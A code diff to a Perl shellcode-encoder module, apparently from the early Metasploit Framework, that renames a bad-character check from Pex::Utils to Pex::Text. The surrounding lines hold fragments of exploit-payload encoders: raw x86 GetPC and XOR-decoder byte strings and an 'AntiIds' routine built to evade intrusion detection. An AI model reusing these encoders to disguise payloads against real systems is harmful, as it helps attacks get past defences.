@@ -16,6 +16,7 @@
 
 package Pex::Encoder;
 use strict;
+use Pex::Text;
 
 
 #
@@ -86,7 +87,7 @@ sub Encode {
     # If you are using this with msf, this check will happen again inside of
     # the framework, but the check remains for standalone pex usage
     # sanity checking, this should never happen
-    if(Pex::Utils::CharsInBuffer($encoded, $badChars)) {
+    if(Pex::Text::CharsInBuffer($encoded, $badChars)) {
       print "Caught bad chars in @encoderName\n" if($debug);
     }
     else {
@@ -206,7 +207,7 @@ sub EncodeAlphaNum {
         $prepend = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff";
         
         # if it doesnt work, use this behemoth with minimized chars
-        if (Pex::Utils::CharsInBuffer($prepend, $xbadc))
+        if (Pex::Text::CharsInBuffer($prepend, $xbadc))
         {
             # unique chars: 59 EB E8 A4 FF
             $prepend = 
@@ -226,7 +227,7 @@ sub EncodeAlphaNum {
     my $allowed = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXY';
     
     # first check to see if the encoder/alphabet is allowed 
-    if ( Pex::Utils::CharsInBuffer($allowed.$decoder.'Z', $xbadc) )
+    if ( Pex::Text::CharsInBuffer($allowed.$decoder.'Z', $xbadc) )
     {
         print "Encoder failed: restricted character in decoder or alphabet\n" if($debug);
         return;
@@ -252,7 +253,7 @@ sub EncodeAlphaNum {
 
     my $win32getpc = 'VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36FFFFTXVj0PPTUPPa301089';
     
-    if ($type eq 'win32' && ! Pex::Utils::CharsInBuffer($baseaddr{'win32'}.$win32getpc, $xbadc))
+    if ($type eq 'win32' && ! Pex::Text::CharsInBuffer($baseaddr{'win32'}.$win32getpc, $xbadc))
     {
         $encoded = $win32getpc . $baseaddr{'win32'} . $decoder;
     } 
@@ -318,21 +319,21 @@ sub XorDecoderDwordAntiIds {
             my $lenops = "\x66\x81\xe9";
             $xorlen = pack("v", $loopCounter);
             
-            if (Pex::Utils::CharsInBuffer($xorlen, $xbadc))
+            if (Pex::Text::CharsInBuffer($xorlen, $xbadc))
             {
                 $xorlen = pack("v", abs($loopCounter));
                 $lenops = "\x66\x81\xc1";
                 $loopmode = "add";
             }
             
-            if (Pex::Utils::CharsInBuffer($xorlen, $xbadc) && $loopCounter < 128)
+            if (Pex::Text::CharsInBuffer($xorlen, $xbadc) && $loopCounter < 128)
             {
                 $xorlen = chr(abs($loopCounter)) . "\x59\x90\x90";
                 $lenops = "\x6a";
                 $loopmode = "push";
             }
             
-            if (! Pex::Utils::CharsInBuffer($xorlen, $xbadc))
+            if (! Pex::Text::CharsInBuffer($xorlen, $xbadc))
             {
                 my $decoder = 
                 "\xd9\xe1".                 # fabs
